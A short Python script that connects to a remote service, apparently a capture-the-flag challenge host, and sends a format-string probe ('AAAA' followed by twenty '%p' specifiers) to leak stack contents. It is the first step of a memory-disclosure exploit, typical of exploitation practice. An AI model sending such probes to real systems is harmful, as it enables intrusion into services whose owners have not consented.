
import socket
import sys

HOST = 'pods.shibirsec.qzz.io'
PORT = 36106

def test_format_string(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        print(f"[+] Connected to {HOST}:{PORT}")

        # Receive banner
        banner = s.recv(1024).decode()
        print(banner)

        print(f"[+] Sending payload: {payload.strip()}")
        s.sendall(payload.encode())

        # Receive response
        response = s.recv(4096).decode()
        print(response)

    except Exception as e:
        print(f"[!] Connection failed: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    # Test for format string vulnerability
    # AAAA followed by %p's to see stack contents
    # We add a newline because the program expects it for input
    format_string_payload = b"AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n"
    test_format_string(format_string_payload.decode())
